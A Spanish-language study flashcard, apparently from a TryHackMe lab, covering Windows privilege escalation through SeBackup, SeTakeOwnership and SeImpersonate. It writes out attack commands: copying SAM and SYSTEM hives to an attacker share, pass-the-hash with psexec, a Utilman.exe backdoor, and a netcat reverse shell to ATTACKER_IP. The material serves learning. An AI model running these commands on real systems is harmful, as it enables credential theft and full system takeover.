### Flashcard: Windows Privilege Escalation (Privileges)

**1. Concepto base**

* Cada usuario tiene privilegios que permiten tareas específicas del sistema.
* Ver privilegios del usuario actual:

```cmd
whoami /priv
```

* Exploitable privileges: SeBackup, SeRestore, SeTakeOwnership, SeImpersonate, SeAssignPrimaryToken.

---

**2. SeBackup / SeRestore**

* Permite leer y escribir cualquier archivo, ignorando DACL.
* Técnica: copiar hives `SAM` y `SYSTEM` → extraer hashes → Pass-the-Hash.

```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
copy C:\Users\THMBackup\*.hive \\ATTACKER_IP\public\
```

```bash
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
python3 psexec.py -hashes <LMHASH:NTHASH> administrator@VICTIM_IP
```

---

**3. SeTakeOwnership**

* Permite adueñarse de cualquier archivo/objeto y asignarse permisos.
* Ejemplo: abuso de `Utilman.exe` para ganar SYSTEM.

```cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant <usuario>:F
copy cmd.exe utilman.exe
```

* En lock screen → botón Ease of Access → cmd con SYSTEM.

---

**4. SeImpersonate / SeAssignPrimaryToken**

* Permite a un proceso impersonar otros usuarios.
* Escalada con **RogueWinRM** (abuso de BITS → WinRM).

En atacante:

```bash
nc -lvp 4442
```

En víctima:

```cmd
C:\tools\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

* Resultado: shell con SYSTEM.

---

### Glosario

* **Privilege**: Derecho asignado a un usuario para realizar acciones específicas en Windows.
* **DACL (Discretionary Access Control List)**: Lista que define quién puede acceder a un objeto.
* **SeBackup / SeRestore**: Privilegios para ignorar DACL y leer/escribir archivos críticos.
* **SAM (Security Account Manager)**: Registro donde Windows almacena hashes de contraseñas.
* **SYSTEM hive**: Registro que contiene claves necesarias para descifrar hashes del SAM.
* **Takeown / Icacls**: Herramientas para tomar propiedad y asignar permisos sobre objetos.
* **Utilman.exe**: Programa de accesibilidad de Windows que corre como SYSTEM.
* **Impersonation**: Capacidad de ejecutar acciones con el contexto de otro usuario.
* **BITS (Background Intelligent Transfer Service)**: Servicio que puede ser explotado para escalar privilegios.
* **WinRM (Windows Remote Management)**: Protocolo para administrar Windows remotamente (similar a SSH).
* **Pass-the-Hash**: Técnica que reutiliza hashes NTLM para autenticarse sin conocer la contraseña en texto claro.
